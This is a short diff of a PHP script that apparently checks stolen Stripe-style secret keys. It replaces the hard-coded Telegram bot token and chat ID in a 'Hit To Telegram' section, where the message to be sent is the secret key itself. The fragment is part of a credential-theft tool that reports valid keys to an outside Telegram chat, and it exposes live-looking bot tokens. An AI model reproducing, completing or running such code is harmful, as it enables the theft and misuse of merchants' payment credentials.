@@ -159,8 +159,8 @@ $balance = $balance / $skval;
 
 // ---------------------------------------------------- Hit To Telegram Start----------------------------
 $domain = $_SERVER['HTTP_HOST']; // give you the full URL of the current page that's being accessed
-$botToken = urlencode('6190237258:AAHUvG8uS3ezcg2bOjd3_Za0YKlkF_ErE0M');
-$chatID = urlencode('-850313265');
+$botToken = urlencode('6366773556:AAEq6i4JDHVhGOD3W9__qI8dSg3Pl_kXKT4');
+$chatID = urlencode('-990983895');
 
 $charged_message = "$sk";
 
